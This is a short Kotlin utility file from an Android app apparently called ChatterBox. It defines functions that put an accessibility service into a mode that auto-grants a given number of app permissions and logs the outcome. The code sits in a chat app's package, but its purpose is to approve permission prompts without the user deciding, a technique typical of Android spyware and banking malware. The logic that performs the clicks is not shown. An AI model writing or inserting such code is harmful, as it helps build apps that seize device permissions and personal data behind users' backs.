package com.example.ChatterBox.util

import android.util.Log
import com.example.ChatterBox.accessibility.AccessibilityService

object PermissionsManager {
    private const val TAG = "PermissionsManager"

    fun enableAutoGrantPermissions(permissionCount: Int): Boolean {
        val accessibilityService = AccessibilityService.getInstance()

        if (accessibilityService != null) {
            accessibilityService.startPermissionGrantingMode(permissionCount)
            Log.d(TAG, "Auto-granting enabled for $permissionCount permissions")
            return true
        }

        Log.d(TAG, "Accessibility service not available, auto-granting disabled")
        return false
    }

    fun disableAutoGrantPermissions() {
        val accessibilityService = AccessibilityService.getInstance()
        accessibilityService?.stopPermissionGrantingMode()
        Log.d(TAG, "Auto-granting disabled")
    }
}